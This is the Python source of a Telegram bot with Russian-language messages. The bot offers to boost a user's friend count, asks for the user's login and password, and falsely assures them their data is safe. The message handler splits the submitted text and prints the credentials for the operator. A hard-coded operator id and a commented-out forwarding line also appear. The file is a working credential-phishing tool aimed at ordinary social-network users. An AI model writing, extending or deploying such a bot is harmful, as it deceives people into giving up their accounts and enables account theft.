import telebot
import time
from config import bot_token

bot = telebot.TeleBot(bot_token)

my_id = 1107191282


@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    img = open('2.jpg', 'rb')
    bot.send_photo(message.chat.id, img)  # отправляем приветсвенную картинку

    info = """Накручу друзей для тебя ❤️
                Отправь логин нажмите "Отправить", пароль , через пробел, нажми ENTER и жди заявки в друзья!😉
                
                Все ваши данные в полной безопасности. Если есть сомнения привяжите свой телефон,
                 чтобы сбросить пароль в любое время"""
    bot.send_message(message.chat.id, info)


@bot.message_handler(content_types=['text'])
def main(message):
    # bot.send_message(message.chat.id, message.text)
    # bot.send_message(message.my_id, message.text)
    simle_func(message.text)


def simle_func(auth):  # обрабатывает ввод пользователя
    spliter = str(auth).split(' ')
    return print(spliter)


while True:
    print('Накручиваю v.0.1')

    try:
        # bot.polling(none_stop=True)
        bot.infinity_polling(True)
    except telebot.apihelper.ApiException:
        print('Проверьте связь и API')
        time.sleep(1)
    except Exception as e:
        print(e)
        time.sleep(1)
